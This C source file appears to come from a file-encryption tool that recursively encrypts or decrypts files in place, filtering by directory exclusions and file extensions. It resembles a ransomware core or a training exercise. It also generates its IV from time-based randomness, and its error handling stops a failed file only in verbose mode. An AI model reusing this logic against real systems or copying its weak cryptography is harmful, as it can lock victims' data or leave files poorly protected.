#include "dcrypt.h"

bool is_entry_handled(const char *foldername)
{
	char *dir_paths[DC_UNHANDLED_DIRS_ARRAY_SIZE] = DC_UNHANDLED_DIRS;

	for (size_t i = 0; i < DC_UNHANDLED_DIRS_ARRAY_SIZE; ++i)
		if (strcmp(foldername, dir_paths[i]) == 0)
			return false;

	return true;
}

// Function to check if a file is in the created_files list
bool is_created_file(
	char *created_files[], size_t created_file_count, const char *filename)
{
	for (size_t i = 0; i < created_file_count; i++)
	{
		if (strcmp(created_files[i], filename) == 0)
			return true; // File is in the created files list
	}
	return false; // File is not in the created files list
}

void init_dcrypt_header(t_env *env)
{
	// Set the file signature
	memcpy(env->dcrypt_header.signature, DC_SIGNATURE, DC_MAGICNBR_SIZE);
	// Get the encryption key that will be used to encrypt/decrypt the file
	// During decryption, this key will be the IV key
	if (!get_encryption_key(env)) {
		if (env->modes & DC_VERBOSE)
			fprintf(
				stderr,
				FMT_ERROR "Failed to get the encryption key. Aborting...\n"
			);
		exit(EXIT_FAILURE);
	}

	/*
	 * In encryption mode, generate the IV used by AES encryption.
	 * The IV will be saved inside the custom header on the encrypted file.
	 */

	if (!(env->modes & DC_REVERSE)) {
		unsigned char	*iv_key = generate_time_based_rand_key_nanosec(
			DC_KEYCHARSET, DC_AES_KEY_SIZE
		);

		// Copy the IV key to the custom header
		memcpy(env->dcrypt_header.iv_key, iv_key, DC_AES_KEY_SIZE);

		free(iv_key);
	}
}

void handle_file(t_env *env, const char *filepath)
{
	// Init the header that will be placed at the top of the file
	init_dcrypt_header(env);

	/* Create a mapping between the target file and the memory region occupied
	 * by the program. This is to facilitate the memory handling to manipulate
	 * the file data.
	 *
	 * Then, process the encryption
	 */

	if (map_file_into_memory(env, filepath))
		if (env->modes & DC_VERBOSE) {
			perror("An error occurred while attempting to map the file into memory");
			return;
		}

	if (process_mapped_data(env))
		if (env->modes & DC_VERBOSE) {
			if (env->modes & DC_REVERSE)
				fprintf(stderr, FMT_ERROR "Failed to decrypt data.\n");
			else
				fprintf(stderr, FMT_ERROR "Failed to encrypt data.\n");
			// perror("An error occurred while attempting to process the mapped data");
			return;
		}

	// Write the final file data in the target path
	if (write_processed_data_to_file(env, filepath))
		if (env->modes & DC_VERBOSE) {
			perror("An error occurred while attempting to write the mapped data into the file");
			return;
		}
	
	++env->handled_file_count;
}

void handle_dir(t_env *env, char *target_dir_path)
{
	// A list of the created files during the process
	char			*created_files[DC_MAX_FILES];
	size_t			created_files_count = 0;
	// Pointer to hold directory entry information
	struct dirent	*entry;
	// Open the directory stream
	DIR				*dir = opendir(target_dir_path);
	if (!dir) return;

	// Loop through each entry in the directory
	while ((entry = readdir(dir)) != NULL)
	{
		// Check if the entry name starts with a dot (.)
		// This is to skip the current (.) and parent (..) directory entries
		if (is_entry_handled(entry->d_name))
		{
			// Create a buffer to hold the full path
			char		path[1024];
			struct stat	statbuf;

			// Use snprintf() to safely concatenate the strings
			snprintf(
				path, sizeof(path),
				"%s%c%s",
				target_dir_path, DC_PATH_SEP, entry->d_name
			);

			// Check if it's a directory
			if (stat(path, &statbuf) == 0 && S_ISDIR(statbuf.st_mode))
			{
				if (env->modes & DC_VERBOSE)
					printf("\n" FMT_INFO "Reading `%s`, type=DIR...\n", path);

				// Recursive call for subdirectories
				handle_dir(env, path);
			}
			else
			{
				if (env->modes & DC_VERBOSE)
					printf("\n" FMT_INFO "Reading `%s`, type=FILE...\n", path);

				if (created_files_count < DC_MAX_FILES &&
					is_extension_handled(env, path) &&
					!is_created_file(created_files, created_files_count, path))
				{
					handle_file(env, path);

					// Remember the created file path to avoid handling it twice
					created_files[created_files_count] = strdup(path);
					++created_files_count;
				}
			}
		}
	}

	// Free allocated memory for created files
	for (size_t i = 0; i < created_files_count; ++i)
	{
		free(created_files[i]);
		created_files[i] = NULL;
	}

	// Close the directory stream
	closedir(dir);
}
